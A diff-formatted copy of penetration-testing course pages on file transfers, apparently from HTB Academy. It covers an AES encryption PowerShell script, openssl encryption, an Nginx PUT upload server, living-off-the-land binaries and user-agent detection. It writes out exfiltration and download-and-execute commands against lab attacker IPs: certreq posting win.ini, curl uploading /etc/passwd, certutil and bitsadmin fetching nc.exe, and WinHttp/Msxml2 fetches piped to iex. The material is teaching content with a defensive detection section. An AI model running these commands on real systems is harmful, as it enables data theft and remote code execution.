+Decrypts the Base64 encoded string <span class="hljs-string">"LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="</span> <span class="hljs-keyword">and</span> outputs plain text.
+
+.EXAMPLE
+Invoke-AESEncryption -Mode Encrypt -Key <span class="hljs-string">"p@ssw0rd"</span> -Path file.bin
+
+Description
+-----------
+Encrypts the file <span class="hljs-string">"file.bin"</span> <span class="hljs-keyword">and</span> outputs an encrypted file <span class="hljs-string">"file.bin.aes"</span>
+
+.EXAMPLE
+Invoke-AESEncryption -Mode Decrypt -Key <span class="hljs-string">"p@ssw0rd"</span> -Path file.bin.aes
+
+Description
+-----------
+Decrypts the file <span class="hljs-string">"file.bin.aes"</span> <span class="hljs-keyword">and</span> outputs an encrypted file <span class="hljs-string">"file.bin"</span>
+<span class="hljs-comment">#&gt;</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Invoke</span>-<span class="hljs-title">AESEncryption</span> </span>{
+    [CmdletBinding()]
+    [OutputType([string])]
+    Param
+    (
+        [Parameter(Mandatory = $true)]
+        [ValidateSet(<span class="hljs-string">'Encrypt'</span>, <span class="hljs-string">'Decrypt'</span>)]
+        [String]$Mode,
+
+        [Parameter(Mandatory = $true)]
+        [String]$Key,
+
+        [Parameter(Mandatory = $true, ParameterSetName = <span class="hljs-string">"CryptText"</span>)]
+        [String]$Text,
+
+        [Parameter(Mandatory = $true, ParameterSetName = <span class="hljs-string">"CryptFile"</span>)]
+        [String]$Path
+    )
+
+    Begin {
+        $shaManaged = <span class="hljs-keyword">New</span>-Object System.Security.Cryptography.SHA256Managed
+        $aesManaged = <span class="hljs-keyword">New</span>-Object System.Security.Cryptography.AesManaged
+        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+        $aesManaged.BlockSize = <span class="hljs-number">128</span>
+        $aesManaged.KeySize = <span class="hljs-number">256</span>
+    }
+
+    Process {
+        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
+
+        <span class="hljs-keyword">switch</span> ($Mode) {
+            <span class="hljs-string">'Encrypt'</span> {
+                <span class="hljs-keyword">if</span> ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
+
+                <span class="hljs-keyword">if</span> ($Path) {
+                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                    <span class="hljs-keyword">if</span> (!$File.FullName) {
+                        Write-Error -Message <span class="hljs-string">"File not found!"</span>
+                        <span class="hljs-keyword">break</span>
+                    }
+                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                    $outPath = $File.FullName + <span class="hljs-string">".aes"</span>
+                }
+
+                $encryptor = $aesManaged.CreateEncryptor()
+                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, <span class="hljs-number">0</span>, $plainBytes.Length)
+                $encryptedBytes = $aesManaged.IV + $encryptedBytes
+                $aesManaged.Dispose()
+
+                <span class="hljs-keyword">if</span> ($Text) {<span class="hljs-keyword">return</span> [System.Convert]::ToBase64String($encryptedBytes)}
+
+                <span class="hljs-keyword">if</span> ($Path) {
+                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
+                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
+                    <span class="hljs-keyword">return</span> <span class="hljs-string">"File encrypted to $outPath"</span>
+                }
+            }
+
+            <span class="hljs-string">'Decrypt'</span> {
+                <span class="hljs-keyword">if</span> ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
+
+                <span class="hljs-keyword">if</span> ($Path) {
+                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                    <span class="hljs-keyword">if</span> (!$File.FullName) {
+                        Write-Error -Message <span class="hljs-string">"File not found!"</span>
+                        <span class="hljs-keyword">break</span>
+                    }
+                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                    $outPath = $File.FullName -replace <span class="hljs-string">".aes"</span>
+                }
+
+                $aesManaged.IV = $cipherBytes[<span class="hljs-number">0.</span><span class="hljs-number">.15</span>]
+                $decryptor = $aesManaged.CreateDecryptor()
+                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, <span class="hljs-number">16</span>, $cipherBytes.Length - <span class="hljs-number">16</span>)
+                $aesManaged.Dispose()
+
+                <span class="hljs-keyword">if</span> ($Text) {<span class="hljs-keyword">return</span> [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]<span class="hljs-number">0</span>)}
+
+                <span class="hljs-keyword">if</span> ($Path) {
+                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
+                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
+                    <span class="hljs-keyword">return</span> <span class="hljs-string">"File decrypted to $outPath"</span>
+                }
+            }
+        }
+    }
+
+    End {
+        $shaManaged.Dispose()
+        $aesManaged.Dispose()
+    }
+}
+</code></pre>
+<p>We can use any previously shown file transfer methods to get this file onto a target host. After the script has been transferred, it only needs to be imported as a module, as shown below.</p>
+<p><strong>Import Module Invoke-AESEncryption.ps1</strong></p>
+<p>Protected File Transfers</p>
+<pre><code class="lang-powershell-session">PS <span class="hljs-keyword">C</span>:\htb&gt; <span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\Invoke-AESEncryption.ps1
+</code></pre>
+<p>After the script is imported, it can encrypt strings or files, as shown in the following examples. This command creates an encrypted file with the same name as the encrypted file but with the extension "<code>.aes</code>."</p>
+<p><strong>File Encryption Example</strong></p>
+<p>Protected File Transfers</p>
+<pre><code class="lang-powershell-session">PS C:\htb&gt; Invoke-AESEncryption -Mode Encrypt -Key <span class="hljs-string">"p4ssw0rd"</span> -Path .\scan-results<span class="hljs-selector-class">.txt</span>
+
+File encrypted to C:\htb\scan-results<span class="hljs-selector-class">.txt</span><span class="hljs-selector-class">.aes</span>
+PS C:\htb&gt; ls
+
+    Directory: C:\htb
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        <span class="hljs-number">11</span>/<span class="hljs-number">18</span>/<span class="hljs-number">2020</span>  <span class="hljs-number">12</span>:<span class="hljs-number">17</span> AM           <span class="hljs-number">9734</span> Invoke-AESEncryption<span class="hljs-selector-class">.ps1</span>
+-a----        <span class="hljs-number">11</span>/<span class="hljs-number">18</span>/<span class="hljs-number">2020</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span> PM           <span class="hljs-number">1724</span> scan-results<span class="hljs-selector-class">.txt</span>
+-a----        <span class="hljs-number">11</span>/<span class="hljs-number">18</span>/<span class="hljs-number">2020</span>  <span class="hljs-number">12</span>:<span class="hljs-number">20</span> PM           <span class="hljs-number">3448</span> scan-results<span class="hljs-selector-class">.txt</span><span class="hljs-selector-class">.aes</span>
+</code></pre>
+<p>Using very <code>strong</code> and <code>unique</code> passwords for encryption for every company where a penetration test is performed is essential. This is to prevent sensitive files and information from being decrypted using one single password that may have been leaked and cracked by a third party.</p>
+<hr>
+<h3 id="file-encryption-on-linux">File Encryption on Linux</h3>
+<p><a href="https://www.openssl.org/">OpenSSL</a> is frequently included in Linux distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files "nc style" to encrypt files.</p>
+<p>To encrypt a file using <code>openssl</code> we can select different ciphers, see <a href="https://www.openssl.org/docs/man1.1.1/man1/openssl-enc.html">OpenSSL man page</a>. Let's use <code>-aes256</code> as an example. We can also override the default iterations counts with the option <code>-iter 100000</code> and add the option <code>-pbkdf2</code> to use the Password-Based Key Derivation Function 2 algorithm. When we hit enter, we'll need to provide a password.</p>
+<p><strong>Encrypting /etc/passwd with openssl</strong></p>
+<p>Protected File Transfers</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /</span>etc/passwd -out passwd.enc
+
+enter aes<span class="hljs-number">-256</span>-cbc encryption <span class="hljs-string">password:</span>                                                         
+Verifying - enter aes<span class="hljs-number">-256</span>-cbc encryption <span class="hljs-string">password:</span>
+</code></pre>
+<p>Remember to use a strong and unique password to avoid brute-force cracking attacks should an unauthorized party obtain the file. To decrypt the file, we can use the following command:</p>
+<p><strong>Decrypt passwd.enc with openssl</strong></p>
+<p>Protected File Transfers</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ openssl <span class="hljs-keyword">enc</span> -<span class="hljs-keyword">d</span> -aes256 -iter 100000 -pbkdf2 -<span class="hljs-keyword">in</span> passwd.<span class="hljs-keyword">enc</span> -<span class="hljs-keyword">out</span> passwd                    
+
+enter aes-256-cbc decryption password:
+</code></pre>
+<p>We can use any of the previous methods to transfer this file, but it's recommended to use a secure transport method such as HTTPS, SFTP, or SSH. As always, practice the examples in this section against target hosts in this or other modules and reproduce what you can (such as the <code>openssl</code> examples using the Pwnbox. The following section will cover different ways to transfer files over HTTP and HTTPS.</p>
+<h2 id="catching-files-over-http-s">Catching Files over HTTP/S</h2>
+<hr>
+<h3 id="http-s">HTTP/S</h3>
+<p>Web transfer is the most common way most people transfer files because <code>HTTP</code>/<code>HTTPS</code> are the most common protocols allowed through firewalls. Another immense benefit is that, in many cases, the file will be encrypted in transit. There is nothing worse than being on a penetration test, and a client's network IDS picks up on a sensitive file being transferred over plaintext and having them ask why we sent a password to our cloud server without using encryption.</p>
+<p>We have already discussed using the Python3 <a href="https://github.com/Densaugeo/uploadserver">uploadserver module</a> to set up a web server with upload capabilities, but we can also use Apache or Nginx. This section will cover creating a secure web server for file upload operations.</p>
+<hr>
+<h3 id="nginx-enabling-put">Nginx - Enabling PUT</h3>
+<p>A good alternative for transferring files to <code>Apache</code> is <a href="https://www.nginx.com/resources/wiki/">Nginx</a> because the configuration is less complicated, and the module system does not lead to security issues as <code>Apache</code> can.</p>
+<p>When allowing <code>HTTP</code> uploads, it is critical to be 100% positive that users cannot upload web shells and execute them. <code>Apache</code> makes it easy to shoot ourselves in the foot with this, as the <code>PHP</code> module loves to execute anything ending in <code>PHP</code>. Configuring <code>Nginx</code> to use PHP is nowhere near as simple.</p>
+<p><strong>Create a Directory to Handle Uploaded Files</strong></p>
+<p>Catching Files over HTTP/S</p>
+<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ sudo mkdir -p /var</span><span class="hljs-regexp">/www/uploads</span><span class="hljs-regexp">/SecretUploadDirectory</span>
+</code></pre>
+<p><strong>Change the Owner to www-data</strong></p>
+<p>Catching Files over HTTP/S</p>
+<pre><code class="lang-shell-session"><span class="hljs-symbol">root@</span>htb[/htb]$ sudo chown -R www-<span class="hljs-keyword">data</span>:www-<span class="hljs-keyword">data</span> /<span class="hljs-keyword">var</span>/www/uploads/SecretUploadDirectory
+</code></pre>
+<p><strong>Create Nginx Configuration File</strong></p>
+<p>Create the Nginx configuration file by creating the file <code>/etc/nginx/sites-available/upload.conf</code> with the contents:</p>
+<p>Catching Files over HTTP/S</p>
+<pre><code class="lang-shell-session"><span class="hljs-section">server</span> {
+    <span class="hljs-attribute">listen</span> <span class="hljs-number">9001</span>;
+
+    <span class="hljs-attribute">location</span> /SecretUploadDirectory/ {
+        <span class="hljs-attribute">root</span>    /var/www/uploads;
+        <span class="hljs-attribute">dav_methods</span> PUT;
+    }
+}
+</code></pre>
+<p><strong>Symlink our Site to the sites-enabled Directory</strong></p>
+<p>Catching Files over HTTP/S</p>
+<pre><code class="lang-shell-session">
+root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ sudo ln -s /</span>etc<span class="hljs-regexp">/nginx/</span>sites-available<span class="hljs-regexp">/upload.conf /</span>etc<span class="hljs-regexp">/nginx/</span>sites-enabled/
+</code></pre>
+<p><strong>Start Nginx</strong></p>
+<p>Catching Files over HTTP/S</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo systemctl restart nginx.service
+</code></pre>
+<p>If we get any error messages, check <code>/var/log/nginx/error.log</code>. If using Pwnbox, we will see port 80 is already in use.</p>
+<p><strong>Verifying Errors</strong></p>
+<p>Catching Files over HTTP/S</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ tail <span class="hljs-number">-2</span> /var/log/nginx/error.log
+
+<span class="hljs-number">2020</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">16</span>:<span class="hljs-number">11</span>:<span class="hljs-number">56</span> [emerg] <span class="hljs-number">5679</span>#<span class="hljs-number">5679</span>: bind() to <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:`<span class="hljs-number">80</span>` failed (<span class="hljs-number">98</span>: A`ddress already <span class="hljs-keyword">in</span> use`)
+<span class="hljs-number">2020</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">16</span>:<span class="hljs-number">11</span>:<span class="hljs-number">56</span> [emerg] <span class="hljs-number">5679</span>#<span class="hljs-number">5679</span>: still could not bind()
+</code></pre>
+<p>Catching Files over HTTP/S</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-built_in">ss</span> -lnpt | grep <span class="hljs-number">80</span>
+
+LISTEN <span class="hljs-number">0</span>      <span class="hljs-number">100</span>          <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:<span class="hljs-number">80</span>        <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:*    users:((<span class="hljs-string">"python"</span>,pid=<span class="hljs-string">`2811`</span>,fd=<span class="hljs-number">3</span>),(<span class="hljs-string">"python"</span>,pid=<span class="hljs-number">2070</span>,fd=<span class="hljs-number">3</span>),(<span class="hljs-string">"python"</span>,pid=<span class="hljs-number">1968</span>,fd=<span class="hljs-number">3</span>),(<span class="hljs-string">"python"</span>,pid=<span class="hljs-number">1856</span>,fd=<span class="hljs-number">3</span>))
+</code></pre>
+<p>Catching Files over HTTP/S</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ ps -ef | grep 2811
+
+user65     <span class="hljs-number"> 2811 </span>  <span class="hljs-number"> 1856 </span><span class="hljs-number"> 0 </span>16:05 ?        00:00:04 `python -m websockify<span class="hljs-number"> 80 </span>localhost:5901 -D`
+root       <span class="hljs-number"> 6720 </span>  <span class="hljs-number"> 2226 </span><span class="hljs-number"> 0 </span>16:14 pts/0    00:00:00 grep --color=auto 2811
+</code></pre>
+<p>We see there is already a module listening on port 80. To get around this, we can remove the default Nginx configuration, which binds on port 80.</p>
+<p><strong>Remove NginxDefault Configuration</strong></p>
+<p>Catching Files over HTTP/S</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ sudo rm /</span>etc<span class="hljs-regexp">/nginx/</span>sites-enabled/<span class="hljs-keyword">default</span>
+</code></pre>
+<p>Now we can test uploading by using <code>cURL</code> to send a <code>PUT</code> request. In the below example, we will upload the <code>/etc/passwd</code> file to the server and call it users.txt</p>
+<p><strong>Upload File Using cURL</strong></p>
+<p>Catching Files over HTTP/S</p>
+<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ curl -T /etc</span><span class="hljs-regexp">/passwd http:/</span><span class="hljs-regexp">/localhost:9001/</span>SecretUploadDirectory/users.txt
+</code></pre>
+<p>Catching Files over HTTP/S</p>
+<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ sudo tail -1 /var</span><span class="hljs-regexp">/www/uploads</span><span class="hljs-regexp">/SecretUploadDirectory/users</span>.txt 
+
+<span class="hljs-symbol">user65:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span>,,,<span class="hljs-symbol">:/home/user65</span><span class="hljs-symbol">:/bin/bash</span>
+</code></pre>
+<p>Once we have this working, a good test is to ensure the directory listing is not enabled by navigating to <code>http://localhost/SecretUploadDirectory</code>. By default, with <code>Apache</code>, if we hit a directory without an index file (index.html), it will list all the files. This is bad for our use case of exfilling files because most files are sensitive by nature, and we want to do our best to hide them. Thanks to <code>Nginx</code> being minimal, features like that are not enabled by default.</p>
+<hr>
+<h3 id="using-built-in-tools">Using Built-in Tools</h3>
+<p>In the next section, we'll introduce the topic of "Living off the Land" or using built-in Windows and Linux utilities to perform file transfer activities. We will repeatedly come back to this concept throughout the modules in the Penetration Tester path when covering tasks such as Windows and Linux privilege escalation and Active Directory enumeration and exploitation.</p>
+<p><a href="https://academy.hackthebox.com/module/24/section/684">Previous</a> Mark Complete &amp; Next<a href="https://academy.hackthebox.com/module/24/section/1575">Next </a>Cheat Sheet\</p>
+<h2 id="living-off-the-land">Living off The Land</h2>
+<hr>
+<p>The phrase "Living off the land" was coined by Christopher Campbell <a href="https://twitter.com/obscuresec">@obscuresec</a> &amp; Matt Graeber <a href="https://twitter.com/mattifestation">@mattifestation</a> at <a href="https://www.youtube.com/watch?v=j-r6UonEkUw">DerbyCon 3</a>.</p>
+<p>The term LOLBins (Living off the Land binaries) came from a Twitter discussion on what to call binaries that an attacker can use to perform actions beyond their original purpose. There are currently two websites that aggregate information on Living off the Land binaries:</p>
+<ul>
+<li><a href="https://lolbas-project.github.io/">LOLBAS Project for Windows Binaries</a></li>
+<li><a href="https://gtfobins.github.io/">GTFOBins for Linux Binaries</a></li>
+</ul>
+<p>Living off the Land binaries can be used to perform functions such as:</p>
+<ul>
+<li>Download</li>
+<li>Upload</li>
+<li>Command Execution</li>
+<li>File Read</li>
+<li>File Write</li>
+<li>Bypasses</li>
+</ul>
+<p>This section will focus on using LOLBAS and GTFOBins projects and provide examples for download and upload functions on Windows &amp; Linux systems.</p>
+<hr>
+<h3 id="using-the-lolbas-and-gtfobins-project">Using the LOLBAS and GTFOBins Project</h3>
+<p><a href="https://lolbas-project.github.io">LOLBAS for Windows</a> and <a href="https://gtfobins.github.io/">GTFOBins for Linux</a> are websites where we can search for binaries we can use for different functions.</p>
+<h4 id="lolbas">LOLBAS</h4>
+<p>To search for download and upload functions in <a href="https://lolbas-project.github.io/">LOLBAS</a> we can use <code>/download</code> or <code>/upload</code>.</p>
+<p><img src="storage\modules\24\lolbas\_upload.jpg" alt="image"></p>
+<p>Let's use <a href="https://lolbas-project.github.io/lolbas/Binaries/Certreq/">CertReq.exe</a> as an example.</p>
+<p>We need to listen on a port on our attack host for incoming traffic using Netcat and then execute certreq.exe to upload a file.</p>
+<p><strong>Upload win.ini to our Pwnbox</strong></p>
+<pre><code class="lang-cmd-session"><span class="hljs-string">C:</span>\htb&gt; certreq.exe -Post -config <span class="hljs-string">http:</span><span class="hljs-comment">//192.168.49.128:8000/ c:\windows\win.ini</span>
+Certificate Request <span class="hljs-string">Processor:</span> The operation timed out <span class="hljs-number">0x80072ee2</span> (<span class="hljs-string">WinHttp:</span> <span class="hljs-number">12002</span> ERROR_WINHTTP_TIMEOUT)
+</code></pre>
+<p>This will send the file to our Netcat session, and we can copy-paste its contents.</p>
+<p><strong>File Received in our Netcat Session</strong></p>
+<pre><code class="lang-shell-session">[!bash!]$ sudo nc -lvnp 8000
+
+listening on [any] 8000 ...
+connect to [192.168.49.128] from (UNKNOWN) [192.168.49.1] 53819
+POST / HTTP/1.1
+<span class="hljs-keyword">Cache</span>-Control: <span class="hljs-keyword">no</span>-<span class="hljs-keyword">cache</span>
+<span class="hljs-keyword">Connection</span>: <span class="hljs-keyword">Keep</span>-Alive
+<span class="hljs-keyword">Pragma</span>: <span class="hljs-keyword">no</span>-<span class="hljs-keyword">cache</span>
+<span class="hljs-keyword">Content</span>-<span class="hljs-keyword">Type</span>: application/<span class="hljs-keyword">json</span>
+<span class="hljs-keyword">User</span>-<span class="hljs-keyword">Agent</span>: Mozilla/<span class="hljs-number">4.0</span> (compatible; Win32; NDES client 10.0.19041.1466/vb_release_svc_prod1)
+Content-Length: 92
+Host: 192.168.49.128:8000
+
+; for 16-bit app support
+[fonts]
+[extensions]
+[mci extensions]
+[files]
+[Mail]
+MAPI=1
+</code></pre>
+<p>If you get an error when running <code>certreq.exe</code>, the version you are using may not contain the <code>-Post</code> parameter. You can download an updated version <a href="https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe">here</a> and try again.</p>
+<h4 id="gtfobins">GTFOBins</h4>
+<p>To search for the download and upload function in <a href="https://gtfobins.github.io/">GTFOBins for Linux Binaries</a>, we can use <code>+file download</code> or <code>+file upload</code>.</p>
+<p><img src="storage\modules\24\gtfobins\_download.jpg" alt="image"></p>
+<p>Let's use <a href="https://www.openssl.org/">OpenSSL</a>. It's frequently installed and often included in other software distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files "nc style."</p>
+<p>We need to create a certificate and start a server in our Pwnbox.</p>
+<p><strong>Create Certificate in our Pwnbox</strong></p>
+<pre><code class="lang-shell-session">[!bash!]$ openssl req -newkey rsa:<span class="hljs-number">2048</span> -nodes -keyout key.pem -x509 -days <span class="hljs-number">365</span> -out certificate.pem
+
+Generating a RSA private key
+.......................................................................................................+++++
+................+++++
+writing new private key to <span class="hljs-string">'key.pem'</span>
+-----
+You are about to be asked to enter information that will be incorporated
+into your certificate request.
+What you are about to enter is what is called a Distinguished Name or a DN.
+There are quite a few fields but you can leave some blank
+For some fields there will be a default value,
+If you enter <span class="hljs-string">'.'</span>, the field will be left blank.
+-----
+Country Name (<span class="hljs-number">2</span> letter <span class="hljs-keyword">code</span>) [AU]:
+State or Province Name (full name) [Some-State]:
+Locality Name (eg, city) []:
+Organization Name (eg, company) [Internet Widgits Pty Ltd]:
+Organizational Unit Name (eg, section) []:
+Common Name (e.g. server FQDN or YOUR name) []:
+Email Address []:
+</code></pre>
+<p><strong>Stand up the Server in our Pwnbox</strong></p>
+<pre><code class="lang-shell-session">[!bash!]$ openssl s_server -quiet -accept <span class="hljs-number">80</span> -cert certificate<span class="hljs-selector-class">.pem</span> -key key<span class="hljs-selector-class">.pem</span> &lt; /tmp/LinEnum.sh
+</code></pre>
+<p>Next, with the server running, we need to download the file from the compromised machine.</p>
+<p><strong>Download File from the Compromised Machine</strong></p>
+<pre><code class="lang-shell-session"><span class="hljs-string">[!bash!]</span>$ openssl s_client -connect <span class="hljs-number">10.10.10.32:80</span> -quiet &gt; LinEnum.sh
+</code></pre>
+<hr>
+<h3 id="other-common-living-off-the-land-tools">Other Common Living off the Land tools</h3>
+<h4 id="bitsadmin-download-function">Bitsadmin Download function</h4>
+<p>The <a href="https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal">Background Intelligent Transfer Service (BITS)</a> can be used to download files from HTTP sites and SMB shares. It "intelligently" checks host and network utilization into account to minimize the impact on a user's foreground work.</p>
+<p><strong>File Download with Bitsadmin</strong></p>
+<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb-student<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\n</span>c.exe
+</code></pre>
+<p>PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers.</p>
+<p><strong>Download</strong></p>
+<pre><code class="lang-powershell-session"><span class="hljs-symbol">PS</span> C:\htb&gt; <span class="hljs-meta">Import</span>-Module <span class="hljs-keyword">bitstransfer; </span>Start-<span class="hljs-keyword">BitsTransfer </span>-Source <span class="hljs-string">"http://10.10.10.32:8000/nc.exe"</span> -Destination <span class="hljs-string">"C:\Windows\Temp\nc.exe"</span>
+</code></pre>
+<hr>
+<h4 id="certutil">Certutil</h4>
+<p>Casey Smith (<a href="https://twitter.com/subtee?lang=en">@subTee</a>) found that Certutil can be used to download arbitrary files. It is available in all Windows versions and has been a popular file transfer technique, serving as a defacto <code>wget</code> for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage.</p>
+<p><strong>Download a File with Certutil</strong></p>
+<pre><code class="lang-cmd-session"><span class="hljs-string">C:</span>\htb&gt; certutil.exe -verifyctl -split -f <span class="hljs-string">http:</span><span class="hljs-comment">//10.10.10.32:8000/nc.exe</span>
+</code></pre>
+<ol>
+<li>\
+Page 9</li>
+<li>Detection</li>
+</ol>
+<h2 id="detection">Detection</h2>
+<hr>
+<p>Command-line detection based on blacklisting is straightforward to bypass, even using simple case obfuscation. However, although the process of whitelisting all command lines in a particular environment is initially time-consuming, it is very robust and allows for quick detection and alerting on any unusual command lines.</p>
+<p>Most client-server protocols require the client and server to negotiate how content will be delivered before exchanging information. This is common with the <code>HTTP</code> protocol. There is a need for interoperability amongst different web servers and web browser types to ensure that users have the same experience no matter their browser. HTTP clients are most readily recognized by their user agent string, which the server uses to identify which <code>HTTP</code> client is connecting to it, for example, Firefox, Chrome, etc.</p>
+<p>User agents are not only used to identify web browsers, but anything acting as an <code>HTTP</code> client and connecting to a web server via <code>HTTP</code> can have a user agent string (i.e., <code>cURL</code>, a custom <code>Python</code> script, or common tools such as <code>sqlmap</code>, or <code>Nmap</code>).</p>
+<p>Organizations can take some steps to identify potential user agent strings by first building a list of known legitimate user agent strings, user agents used by default operating system processes, common user agents used by update services such as Windows Update, and antivirus updates, etc. These can be fed into a SIEM tool used for threat hunting to filter out legitimate traffic and focus on anomalies that may indicate suspicious behavior. Any suspicious-looking user agent strings can then be further investigated to determine whether they were used to perform malicious actions. This <a href="http://useragentstring.com/index.php">website</a> is handy for identifying common user agent strings. A list of user agent strings is available <a href="http://useragentstring.com/pages/useragentstring.php">here</a>.</p>
+<p>Malicious file transfers can also be detected by their user agents. The following user agents/headers were observed from common <code>HTTP</code> transfer techniques (tested on Windows 10, version 10.0.14393, with PowerShell 5).</p>
+<p><strong>Invoke-WebRequest - Client</strong></p>
+<p>Detection</p>
+<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\P</span>ublic<span class="hljs-symbol">\n</span>c.exe" 
+PS C:<span class="hljs-symbol">\h</span>tb&gt; Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\P</span>ublic<span class="hljs-symbol">\n</span>c.exe"
+</code></pre>
+<p><strong>Invoke-WebRequest - Server</strong></p>
+<p>Detection</p>
+<pre><code class="lang-shell-session"><span class="hljs-keyword">GET</span> <span class="hljs-string">/nc.exe</span> HTTP/1.1
+<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
+</code></pre>
+<p><strong>WinHttpRequest - Client</strong></p>
+<p>Detection</p>
+<pre><code class="lang-powershell-session"><span class="hljs-attribute">PS</span> C:\htb&gt; <span class="hljs-variable">$h</span>=new-object -com WinHttp.WinHttpRequest.<span class="hljs-number">5</span>.<span class="hljs-number">1</span>;
+<span class="hljs-attribute">PS</span> C:\htb&gt; <span class="hljs-variable">$h</span>.open(<span class="hljs-string">'GET'</span>,<span class="hljs-string">'http://10.10.10.32/nc.exe'</span>,<span class="hljs-variable">$false</span>);
+<span class="hljs-attribute">PS</span> C:\htb&gt; <span class="hljs-variable">$h</span>.send();
+<span class="hljs-attribute">PS</span> C:\htb&gt; iex <span class="hljs-variable">$h</span>.ResponseText
+</code></pre>
+<p><strong>WinHttpRequest - Server</strong></p>
+<p>Detection</p>
+<pre><code class="lang-shell-session"><span class="hljs-keyword">GET</span> <span class="hljs-string">/nc.exe</span> HTTP/1.1
+<span class="hljs-attribute">Connection</span>: Keep-Alive
+<span class="hljs-attribute">Accept</span>: */*
+<span class="hljs-attribute">User-Agent</span>: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
+</code></pre>
+<p><strong>Msxml2 - Client</strong></p>
+<p>Detection</p>
+<pre><code class="lang-powershell-session"><span class="hljs-attribute">PS</span> C:\htb&gt; <span class="hljs-variable">$h</span>=New-Object -ComObject Msxml2.XMLHTTP;
+<span class="hljs-attribute">PS</span> C:\htb&gt; <span class="hljs-variable">$h</span>.open(<span class="hljs-string">'GET'</span>,<span class="hljs-string">'http://10.10.10.32/nc.exe'</span>,<span class="hljs-variable">$false</span>);
+<span class="hljs-attribute">PS</span> C:\htb&gt; <span class="hljs-variable">$h</span>.send();
+<span class="hljs-attribute">PS</span> C:\htb&gt; iex <span class="hljs-variable">$h</span>.responseText
+</code></pre>
+<p><strong>Msxml2 - Server</strong></p>
+<p>Detection</p>
+<pre><code class="lang-shell-session"><span class="hljs-keyword">GET</span> <span class="hljs-string">/nc.exe</span> HTTP/1.1
+<span class="hljs-attribute">Accept</span>: */*
+<span class="hljs-attribute">Accept-Language</span>: en-us
+<span class="hljs-attribute">UA-CPU</span>: AMD64
+<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate
+<span class="hljs-attribute">User-Agent</span>: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
+</code></pre>
+<p><strong>Certutil - Client</strong></p>
+<p>Detection</p>
+<pre><code class="lang-cmd-session"><span class="hljs-string">C:</span>\htb&gt; certutil -urlcache -split -f <span class="hljs-string">http:</span><span class="hljs-comment">//10.10.10.32/nc.exe </span>
+<span class="hljs-string">C:</span>\htb&gt; certutil -verifyctl -split -f <span class="hljs-string">http:</span><span class="hljs-comment">//10.10.10.32/nc.exe</span>
+</code></pre>
